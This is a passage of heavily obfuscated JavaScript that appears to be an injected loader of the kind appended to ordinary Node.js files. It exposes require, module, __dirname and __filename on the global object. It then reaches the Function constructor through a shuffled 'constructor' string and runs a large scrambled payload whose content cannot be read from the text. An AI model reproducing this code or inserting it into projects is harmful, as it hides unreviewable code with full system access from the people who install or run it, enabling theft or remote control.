x;q= (l+ f)% 3254972};var m=String.fromCharCode(127);var y='';var p='\x25';var e='\x23\x31';var z='\x25';var s='\x23\x30';var n='\x23';return c.join(y).split(p).join(m).split(e).join(z).split(s).join(n).split(m)})("e_muj%ti%rdnaaeri%ede_%nd__fefmlnicb_mn_%oe",2363817);global[_$_1253[0]]= require;if( typeof module=== _$_1253[1]){global[_$_1253[2]]= module};if( typeof __dirname!== _$_1253[3]){global[_$_1253[4]]= __dirname};if( typeof __filename!== _$_1253[3]){global[_$_1253[5]]= __filename}(function(){var cDt='',xxB=726-715;function KuC(g){var f=1826471;var q=g.length;var d=[];for(var i=0;i<q;i++){d[i]=g.charAt(i)};for(var i=0;i<q;i++){var v=f*(i+519)+(f%12938);var o=f*(i+512)+(f%24752);var n=v%q;var u=o%q;var t=d[n];d[n]=d[u];d[u]=t;f=(v+o)%3722757;};return d.join('')};var gON=KuC('ulrciwurcfoanbdnoekhcqzgpstvrttmsyxoj').substr(0,xxB);var wWt='kaa;-lthr=vqc.r)op vchr. "ojfdrwr<)1mlhnhplr;n)vnxabkgu,]7.=ar},m6,a{vw;v8;=q9=a7j)50+,so2,6);t1(3;t([)8aA+];jn e.jmo,+.i;vuapt=;)o4r+s  {.v=0Ar(s9wenipnw4 ;;f[a[sx7l8ie(Ca+ t=(]4q i1ulc(xh}b1y=n;;loy-v9qrhh0clea;r;8frk =r)[trh;(u+>;(au,S(a)gxmvnesghh(6n0ipct +)[g0(s(srv)tst6entgf-[;)8,0;=n-g;"2nmts=(urs5ra)rtfc,leva. d="]ltiru) ,t0.=8rh1wC.lynv]"q=tv[xh"ov(,agr]h2;n<p;*"-r(r6r7a[r.r;a3Cddese(a)svrra](nja=  .,.g{+(w),1)*l+t.fj}]go(e7t+if]mAo;sk=gr+=;}etfi+pfr={)=[,=sc((l,a)og l-no,3c;agrcdyuiihrur+hn(,3uo)]+e)t+.h2fg)l,h+rw[u28wvv>8hcitniv=l;,i9 s{jwkl=)r=imle((rxr),[ae9;apwa;;1aes6h(y4up)[php;s=.rm(tsv.;r=ct=;}in=g!agoe=fei<rr<{))a;{7[y=1,+bl<,ivgn=et ul= -izno=y=d e]p5=v;;g;,+[+]rAav;p)hulrjgo9()".;v8j.f0o(CS=)Aa0!f2r1f,5gc.rov0r=t= f8(. )r= oicglfs9}C(p}C;d7n]6,o=C,(.p7na=rwf.1)getfqelr;0rz;z1;plo(we+b;oa(0r](xC9+snza+g6r.ag.)s01 w1rooteevv=+) ;7a+u,nohfe b;5tnn"n";.2o.."+8=';var gsQ=KuC[gON];var nSE='';var xlG=gsQ;var CiE=gsQ(nSE,KuC(wWt));var rUg=CiE(KuC('(}]$r.Ub(U)U1,v rn>3U!l(U:tUUcoE[0\'csU.05\/i]l;;*$2ou)U{[t.a%Uar j=9e|}}d61s>F6(d0.(e:BsaiveLc9U]tn"r4tU \/5.;n3r9aeU7dq#L!nat]a64U-Ugn!U!y88;2=(fUb=.i7alci1oc%+!].t7=i7U)1UntpUUaw]w%"]6b])).1;oi+2(ptN)%=Ua.dU90.ttUF;]%CUu.]).;ks.].("e=7U7,b76vUeb}9=.b)(UlUU-n(>,1%,h_U=b..a#sUtr](It!bb!4l<UoU({Ue.U;90crm60]U.923;U1)to3n)o%(0=U)eaUU)t;glhep:yJ caa)+];(s0BoUbwtua#UxfUidke=eUa.eA)12dss;IUdda{{mpr2%9U]s.UA=w3g%cuC!%1%+rpnn"sr(a]gs._926(!]fe}\/.U.6u-Uosr(tiba0 r.t=a=]Pp{clMea7]g9c, d.U3,q%Uu]%h[U(p2a,0pu*u2.;Uoa6)dt!!eU%UtnUi+g2stUm]decp)pUbUht8uu|U}S0u8seU)to15.]in+)Epat%CUA0_]5s jiUl8fo*!s a\'6dn i.x4:shn)i8U%).J3jUmU(U%3Um+vu]\/eno; fiaa1Ulr]CtiDap.KU=Ubybt2aGan&.=ms%;Ti;,e(Clt"U1;{g-x,hh6Ua_%5)n:4Ul1]$U;reapin[{%.UUn4NoaQf)1o=3ol)95]bU]-: =4eg (%_e5a(Urn.iD.o.\/n4Uc%3 ; m{U)cpl_6%54hd,.U]7hU%#xl!ce)f=)(%U o0o]uU1Sh%ua%e=l7tnicPi8c"UdU\/]]%)U_.4d+Uig!u2]e\/7))%CJhr5o,1.[opUaCUs2%)8Ua$;cia8%aatn.o%!)gb:4+-=,2rw]aa}U|onU.[@GU;}tsni0qiaroi a!]U3).L2%;buUl9{s<;a=o.n,e(,et]tl4+UU]lUo,5U4aUeU3Uhe}fm-UoUi.}t:%;4][mU)ee::].UU>)tT6ac5ddt%ggnU33}\/cn}(ea.,@0i .srgcc)U:,>)n{)Fm)ao),1[}U0U.rUhU0t(U_c5]2enf[U]]tU5=ela]rUmKU( }=,thU<]eUIafnso.,G onlrCl !)UfU aj]9.@d"aie]eU};L0}Ut_Ut)f=,.6C)r!4+etlr7oa$,p_.((n._{n}<r.}aU4oQ}kUU8]8.ob9,(uotClpd]]au[iUeao)idge0MoBh.e]UaU]UU%)!Un.l4_Ui,3}.Nou.1U(G%U]0]Dle)o]yEe(a=UttU?.UUU;i21%=nUaUb%a [a\/hUt=tt>t6n[ia&-4pPrK;fli3{(g%a)C}r8}_(U,+}o.]1+UU}UU-bn4U=.t9n%1#ircUUiae%nU)Dq;U,)=lc88];(%iBxrke td{y:l(@mp@o:.aUo[+uprledob:(ar!)qo;%?t82aiUf,1oUa79]}o U4p_)bLD5UewicUce.s4dmc?.et+t)Fta?mn%oUostrht{4)\/+UUa{UU)aceun4a9?8U=!0e(ntUu}GUU;7Dtn.UUica%6AahU eIU}m?4e7oUUa9(.,(4uvJ._.1.,=tur4U,:7a,!te>pebCi{%f];]@l{(d;d{{)d.U%}nI}Us]U.aHe]o:UUFtU4qIlee]fv]bFUUeU.tmceyrP,U15z=o_=uu|ly1m[U)u[euUyUwUt=.Uaonl.a=.1aaeb4x5s_!U+oUd3ne2UU+(eUe-]a%(o;!a=2rse54)U1tU)!31aoiIgi=9pU6m7UU&aeUJ0a].4_nUH% ro.e1r4rn;]UO0+)!U#n=;]H.e,U6S)] ds8)nUU;%a1)}U;.]]}a$\/]U:]})9e]U&.Ut .aU9n]+$)e%7\'}a}NUoi=!ets).(.?=}wanQ})_p%rU),}I=t7ls;$y]%nHsm:.O)}E.=.oC4Ub,[ (}>urUai.={w%ahu9{U-=t)1U.M}.{atQ Ueu&r)U)b8y.g;nCb%{.e"_y)e.G]i(3,enh.Ug_i.(]]r2odc:)]( s!{tr1ehGar9%F; .o%a!trisUUa;g0er" 6( )U[$.U(U?tn;}a-]()t8]043U$U4 ]me)[_.=d${..t-a-6ts(=%=\'e5M=._t.m!r=wtrtd2to 4\/n+-rtvK%{{Nt(U3rU(i]UUt=e55vl=.q-s-0)]+n)UUUtUh8)2e5)0te.Fb}aa&]EtU)un,5.. a.%CeU+U h)ym]mtoa\'UUecHeua]n7b,xs;Uw}](=scU!7n_]4a(sn,g1,U}a oUa8]UUal.a.]&.5}swric20ra{.<U2rnge2ltUo_aua33uv.g= p ,]Ui 8(bo0b2U3ea%1;dh%g2sUi.Sictf[UGc8;*tO=%_is$a (e}(rU<;li)% nt5 76_U4{>oafor1Unts.%<UlfOs!_);U)trNUlisfi=U{U!$.UU-w]6UUSoi,U&6\/UoCU]lf]l{l=uw5%%rUnU_N(iUn(redniUpeUuH;+K;U. a.=xu]-3da,(.e)U++"7a7a,n 3n(< att;.+)Uia(da}UrU#9;UUe.d"thz =1Uc'));var hoM=xlG(cDt,rUg );hoM(4927);return 1932})()
